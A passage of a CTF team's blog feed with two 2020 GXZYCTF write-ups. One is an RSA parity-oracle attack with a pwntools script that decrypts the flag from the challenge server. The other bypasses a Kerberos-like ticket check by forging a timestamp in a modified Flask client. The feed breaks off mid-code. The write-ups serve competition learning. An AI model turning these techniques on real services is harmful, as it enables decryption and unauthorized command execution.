      <category term="Web_Java反序列化" scheme="https://boiteam.github.io/tags/Web-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF lancet</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_crypto-lancet/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_crypto-lancet/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T13:12:01.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>访问服务器可得e、n，每次访问的值是随机的。服务器上可选加密或者解密两种方式。正常解法应该是构造（c*2）^e % n，返回值除以2便是m。</li><li>但是由于服务器返回的解密结果不全，经验证仅为结果的最后一位。</li><li>通过其返回结果可判断，由于n为奇数，flag最后字符为’}’因此m也为奇数。m乘以任意一个偶数模n肯定为奇数，除非m&gt;n</li><li>因此构造（c<em>（2^i））^e % n 爆破出i，即恰好当（c</em>（2^i））^e % n的返回值为偶数时可得n 约等于m*i</li><li>通过上述方法爆破i可求出flag</li><li>由于比赛时该题没做出来，后来复现时服务器关闭了，现放VN脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> enc</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> decimal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(c)</span>:</span></span><br><span class="line">    fuck = enc(long_to_bytes(c))</span><br><span class="line">    l = len(fuck)</span><br><span class="line">    r.recvuntil(<span class="string">'want here'</span>)</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'send how long you want to decrypt'</span>)</span><br><span class="line">    r.send(str(l))</span><br><span class="line">    r.recvuntil(<span class="string">'send the message in base64 encode'</span>)</span><br><span class="line">    r.send(fuck)</span><br><span class="line">    res = r.recvline()</span><br><span class="line">    res = r.recvline()</span><br><span class="line">    log.info(res)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'res:1'</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'res:0'</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial</span><span class="params">(n,e,c)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> c_of_2</span><br><span class="line">    k = n.bit_length()</span><br><span class="line">    decimal.getcontext().prec = k</span><br><span class="line">    lower = decimal.Decimal(<span class="number">0</span>)</span><br><span class="line">    upper = decimal.Decimal(n)</span><br><span class="line">    c_of_2 = pow(<span class="number">2</span>, e, n)</span><br><span class="line">    c = (c * c_of_2) % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</span><br><span class="line">        possible_plaintext = (lower + upper) / <span class="number">2</span></span><br><span class="line">        flag = oracle(c)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            upper = possible_plaintext</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lower = possible_plaintext</span><br><span class="line">        c = (c * c_of_2) % n</span><br><span class="line">        <span class="keyword">print</span> i, flag, int(upper - lower)</span><br><span class="line">    <span class="keyword">return</span> int(upper)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'121.37.174.33'</span>,<span class="number">9999</span>)</span><br><span class="line">r.recvuntil(<span class="string">'n:'</span>)</span><br><span class="line">n = r.recvuntil(<span class="string">'\ne:'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">n = int(n)</span><br><span class="line">r.recvuntil(<span class="string">'flag:'</span>)</span><br><span class="line">c = r.recvuntil(<span class="string">'\nyou'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">c = int(c)</span><br><span class="line">log.success(hex(n))</span><br><span class="line">log.success(hex(c))</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(partial(n,e,c))</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;访问服务器可得e、n，每次访问的值是随机的。服务器上可选加密或者解密两种方式。正常解法应该是构造（c*2）^e % n，返回值除以2便是m。&lt;/li&gt;
&lt;li&gt;但是由于服务器返回的解密结果不全，经验证仅为结果的最后一位。&lt;/li&gt;
&lt;li&gt;通过其返回结果可判断，由于n为奇数，flag最后字符为’}’因此m也为奇数。m乘以任意一个偶数模n肯定为奇数，除非m&amp;gt;n&lt;/li&gt;
&lt;li&gt;因此构造（c&lt;em&gt;（2^i））^e % n 爆破出i，即恰好当（c&lt;/em&gt;（2^i））^e % n的返回值为偶数时可得n 约等于m*i&lt;/li&gt;
&lt;li&gt;通过上述方法爆破i可求出flag&lt;/li&gt;
&lt;li&gt;由于比赛时该题没做出来，后来复现时服务器关闭了，现放VN脚本&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; base64 &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; b64encode &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; enc&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.Util.number &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; decimal&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;oracle&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(c)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fuck = enc(long_to_bytes(c))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    l = len(fuck)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;want here&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.sendline(&lt;span class=&quot;string&quot;&gt;&#39;2&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;send how long you want to decrypt&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.send(str(l))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;send the message in base64 encode&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.send(fuck)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    res = r.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    res = r.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    log.info(res)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;res:1&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; res:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;res:0&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; res:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;partial&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(n,e,c)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;global&lt;/span&gt; c_of_2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    k = n.bit_length()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    decimal.getcontext().prec = k&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lower = decimal.Decimal(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    upper = decimal.Decimal(n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    c_of_2 = pow(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, e, n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    c = (c * c_of_2) % n&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(k):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        possible_plaintext = (lower + upper) / &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        flag = oracle(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; flag:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            upper = possible_plaintext&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            lower = possible_plaintext&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        c = (c * c_of_2) % n&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; i, flag, int(upper - lower)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; int(upper)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r = remote(&lt;span class=&quot;string&quot;&gt;&#39;121.37.174.33&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;9999&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;n:&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n = r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;\ne:&#39;&lt;/span&gt;,drop=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n = int(n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;flag:&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c = r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;\nyou&#39;&lt;/span&gt;,drop=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c = int(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.success(hex(n))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.success(hex(c))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;e = &lt;span class=&quot;number&quot;&gt;65537&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(partial(n,e,c))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="Crypto_服务器访问" scheme="https://boiteam.github.io/tags/Crypto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BF%E9%97%AE/"/>
    
      <category term="Crypto_RSA算法原理" scheme="https://boiteam.github.io/tags/Crypto-RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/"/>
    
      <category term="Crypto_RSA最低位爆破" scheme="https://boiteam.github.io/tags/Crypto-RSA%E6%9C%80%E4%BD%8E%E4%BD%8D%E7%88%86%E7%A0%B4/"/>
    
      <category term="Crypto_模数构造" scheme="https://boiteam.github.io/tags/Crypto-%E6%A8%A1%E6%95%B0%E6%9E%84%E9%80%A0/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF dooog</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_dooog/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_dooog/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-22T04:06:05.186Z</updated>
    
    <content type="html"><![CDATA[<p>题目很简单，逻辑捋清楚就行了，从client出发，先后向kdc的getTGT和getTicket发包校验，校验通过则发包到cmd执行，执行没有回显，主要在getTicket中的判断限制了cmd的内容，不过认真分析一下kdc源码，可以发现data变量是可控的，控制前一数据包中的timestamp使得int(time.time()) - data[‘timestamp’] &gt; 60就可以了，所以修改client app.py</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, flash</span><br><span class="line">from flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line">from form <span class="keyword">import</span> RegisterForm, CmdForm</span><br><span class="line">from toolkit <span class="keyword">import</span> AESCipher</span><br><span class="line"><span class="keyword">import</span> os, requests, json, time, base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">"SECRET_KEY"</span>] = os.urandom(<span class="number">32</span>)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/cmd'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def cmd():</span><br><span class="line">    form = CmdForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            cmd = form.cmd.<span class="keyword">data</span></span><br><span class="line">            print(username,master_key,cmd)</span><br><span class="line">            cryptor = AESCipher(master_key)</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:username, <span class="string">'timestamp'</span>: int(time.time())&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'authenticator'</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            session[<span class="string">'session_key'</span>], session[<span class="string">'TGT'</span>] = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">'|'</span>)[<span class="number">0</span>])), res.content.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">            flash(<span class="string">'GET TGT DONE'</span>)</span><br><span class="line">            #visit TGS</span><br><span class="line">            cryptor = AESCipher(session[<span class="string">'session_key'</span>])</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: username, <span class="string">'timestamp'</span>: <span class="number">1</span>&#125;))</span><br><span class="line"></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>,  <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'cmd'</span>: cmd, <span class="string">'authenticator'</span>: base64.b64encode(authenticator), <span class="string">'TGT'</span>: session[<span class="string">'TGT'</span>]&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'cmd error'</span>:</span><br><span class="line">                flash(<span class="string">'cmd not allow'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            flash(<span class="string">'GET Ticket DONE'</span>)</span><br><span class="line">            client_message, server_message = res.content.split(<span class="string">'|'</span>)</span><br><span class="line">            session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">            cryptor = AESCipher(session_key)</span><br><span class="line">            authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>, <span class="keyword">data</span>=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>: authenticator&#125;)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>, flag=res.content)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/register'</span>, methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def register():</span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    elif request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.<span class="keyword">data</span></span><br><span class="line">            master_key = form.master_key.<span class="keyword">data</span></span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/register'</span>, <span class="keyword">data</span>=&#123;<span class="string">'username'</span>: username, <span class="string">'master_key'</span>: master_key&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'duplicate username'</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">            elif res.content != <span class="string">''</span> :</span><br><span class="line">                session[<span class="string">'id'</span>] = int(res.content)</span><br><span class="line">                flash(<span class="string">'register success'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">        <span class="keyword">return</span> 